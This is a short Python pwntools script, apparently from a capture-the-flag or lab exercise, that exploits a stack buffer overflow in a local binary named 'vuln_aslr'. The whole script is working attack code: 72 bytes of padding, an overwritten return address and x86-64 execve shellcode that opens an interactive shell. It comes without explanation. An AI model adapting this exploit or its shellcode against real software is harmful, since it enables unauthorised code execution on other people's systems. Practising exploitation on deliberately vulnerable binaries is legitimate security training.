import struct
import pwn

shellcode = b"\x48\x31\xd2" + \
    b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" + \
    b"\x48\xc1\xeb\x08" + \
    b"\x53" + \
    b"\x48\x89\xe7" + \
    b"\x50" + \
    b"\x57" + \
    b"\x48\x89\xe6" + \
    b"\xb0\x3b" + \
    b"\x0f\x05"

address = struct.pack("<Q", 0x40115e)

s = b'a'*72 + address + shellcode

p = pwn.process('./vuln_aslr')

p.send(s)

p.interactive()